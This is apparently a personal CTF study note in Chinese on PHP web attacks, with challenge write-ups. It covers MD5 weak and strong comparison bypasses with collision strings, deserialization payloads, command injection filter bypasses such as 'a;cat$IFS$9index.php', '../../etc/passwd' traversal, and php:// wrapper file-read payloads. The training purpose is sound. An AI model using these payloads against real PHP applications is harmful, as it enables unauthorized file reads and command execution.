# PHP

## Basic

### POST and GET

* GET参数直接附加在url上，用`&`隔开
* POST参数，HTTP头部添加`Content-Type: application/x-www-form-urlencoded`，报文主体空一行写body，同样用`&`隔开

### WAF 绕过

https://blog.csdn.net/qq_45521281/article/details/105871192



## 比较绕过

PHP `==`为弱比较，`===`为强比较。比较绕过：https://blog.csdn.net/qq_47804678/article/details/128814377

MD5 绕过 https://blog.csdn.net/iczfy585/article/details/106081299

Refer: https://blog.csdn.net/weixin_44511709/article/details/102912004

* PHP中，`==`弱类型判断
* **当md5结果为`0exxxx`，则php当作科学计数法，永远为0**



* MD5 强等绕过

  * md5()无法处理字符串，可以绕过

* 强MD5碰撞
  ```php
   if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
          echo `$cmd`;
      } else {
          echo ("md5 is funny ~");
      }
  ```

  * 强制类型转换无法用Array绕过，以下3字符串md5碰撞

  ```
  $s1 = "%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab"
  $s2 = "%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab"
  $s3 = "%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab"
  ```

  

### Example 1

Example: BUU CODE REVIEW 1

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

1. 使用弱相等碰撞
   ```
   pleasepost=2&md51=s1885207154a&md52=s1836677006a&obj=1
   ```

2. 反序列化漏洞

   * 强比较，需要将`input`指向`correct`，创造完全相等
     ```php
     $obj = new BUU;
     $obj->input = &obj->correct;
     echo serialize($obj);
     ```

   * 使用 PHP playground 运行，输出序列化结果
     ```
     O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
     ```




## 命令注入

```php
shell_exec(chr(108).chr(115))
  
execute() # only display the last line
system() # display the whole line
  
var_dump() # dump return value, combined with following
scandir() # like ls
file_get_contents() # Read file
# example
echo var_dump(scandir("/"));
echo var_dump(file_get_contents("/flag"));
```



## LFI

LFI漏洞通常出现在使用文件包含函数的应用程序中，这些函数根据用户提供的参数来包含文件。例如，在PHP中，`include()` 或 `require()` 函数经常被用来包含其他文件。如果用户输入没有正确过滤，攻击者可以操纵文件路径，使应用程序包含服务器上的任意文件。

### LFI的原理

当应用程序使用如下的代码时，就可能存在LFI漏洞：

```
<?php
$file =$_GET['file'];
include($file);
?>
```

如果攻击者可以控制`$file`的值，他们就可能包含服务器上的任何文件，例如：

```
http://example.com/index.php?file=../../etc/passwd
```

### PHP 伪协议

https://blog.csdn.net/yao_xin_de_yuan/article/details/108326427

* `php://input` 用于读取post数据流

  ```
  条件：
  allow_url_include=On
  allow_url_fopen-Off/On
  
  POC:
  file =php://input
  POST:phpinfo();
  ```

* **php://filter** 是一种元封装器， 设计用于数据流打开时的[筛选过滤](http://php.net/manual/zh/filters.php)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile()](http://php.net/manual/zh/function.readfile.php)、 [file()](http://php.net/manual/zh/function.file.php) 和 [file_get_contents()](http://php.net/manual/zh/function.file-get-contents.php)，

  ```
  条件：
  allow_url_fopen=Off/On
  allow_url_include=Off/On
  
  
  POC:
  ?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
  ```

  * include会默认执行，使用read函数进行编码后，作为普通文本输出，不执行，**用于读取文件内容**




### example

#### [ACTF2020 新生赛]Include

使用PHP伪协议泄露源码

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

#### Ping Ping Ping

命令注入，**需要绕过**

命令注入：https://blog.csdn.net/Manuffer/article/details/120672448

* `&`: 替代`|`
* ` `: 替代`$IFS$9`
* `"`
* `flag`: **拼接后还会检查，无法用变量绕过**
* `bash`
* `<`

获得源码：`a;cat$IFS$9index.php`

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

代码中的正则表达式过滤了以下元素：

1. `& / ? * < > ' " \ ( ) [ ] { }`
16. 控制字符（ASCII码从0到31）：这里用`[\x{00}-\x{1f}]`表示，它匹配了从十六进制的00到1F的所有字符，这些通常是不可见的控制字符。

**绕过flag**: flag检查为顺序，逆向即可绕过 `a;a=ag;b=fl;cat$IFS$9$b$a.php`

### ZJCTF2019 NiZhuanSiWei

1. 分析源码，首先需要绕过判断条件
   ```php
   if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
   ```

   * 使用PHP伪协议input跳过（不能用hackbar，不会加入非变量赋值内容，用burp修改）
     ```
     POST /?text=php://input
     ...
     
     welcome to the zjctf
     ```

2. 源码提示`useless.php`，但无法直接读取内容

   * 通过file变量include方法，**使用filter伪协议`read`转换base64读取**
     ```http
     POST /?text=php://input&file=php://filter/read=convert.base64-encode/resource=useless.php HTTP/1.1
     ...
     
     welcome to the zjctf
     ```

   * 读取结果
     ```php
     <?php  
     
     class Flag{  //flag.php  
         public $file;  
         public function __tostring(){  
             if(isset($this->file)){  
                 echo file_get_contents($this->file); 
                 echo "<br>";
             return ("U R SO CLOSE !///COME ON PLZ");
             }  
         }  
     }  
     ?>  
     ```

   * 通过反序列化Flag类，echo执行`__tostring`函数触发可控include

   * ```php
     O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
     ```

   
